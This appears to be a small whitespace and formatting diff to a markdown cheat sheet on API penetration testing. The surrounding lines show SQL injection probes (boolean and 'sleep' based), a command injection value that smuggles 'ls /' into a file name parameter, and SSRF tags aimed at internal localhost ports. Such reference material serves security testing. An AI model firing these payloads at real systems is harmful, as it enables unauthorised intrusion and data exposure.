@@ -4,7 +4,7 @@
 
 ```json
 {"id":"56456"}                    → OK
-{"id":"56456 AND 1=1#"}           → OK  
+{"id":"56456 AND 1=1#"}           → OK
 {"id":"56456 AND 1=2#"}           → OK
 {"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
 {"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
@@ -29,8 +29,7 @@ api.url.com/endpoint?name=file.txt;ls%20/
 **SSRF via API:**
 
 ```html
-<object data="http://127.0.0.1:8443"/>
-<img src="http://127.0.0.1:445"/>
+<object data="http://127.0.0.1:8443" /> <img src="http://127.0.0.1:445" />
 ```
 
 **.NET Path.Combine Vulnerability:**
